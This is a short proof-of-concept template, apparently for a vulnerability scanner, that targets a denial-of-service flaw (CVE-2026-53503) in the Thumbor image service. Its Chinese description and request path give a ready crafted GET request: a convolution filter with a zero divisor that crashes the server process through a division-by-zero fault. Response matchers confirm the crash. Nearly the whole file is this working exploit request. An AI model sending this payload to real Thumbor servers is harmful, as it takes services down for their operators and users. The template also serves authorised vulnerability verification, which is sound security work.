[info]
author = "AVE"
description = "向 Thumbor 服务发送包含 filters:convolution(,0,true) 的恶意请求，触发 C 扩展层除零异常（SIGFPE），导致进程崩溃，验证远程拒绝服务漏洞存在"
id = "POC-AVE-2026-0768"
name = "Thumbor 卷积滤镜除零错误远程拒绝服务 PoC"
severity = "high"
tags = ["ave-2026-0768"]
vuln_id = [
    "CVE-2026-53503",
    "AVE-2026-0768",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/unsafe/400x400/filters:convolution(1;2;1;2;4;2;1;2;1,0,true)/example.jpg"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "connection reset",
    "connection refused",
    "no route to host",
    "EOF",
]
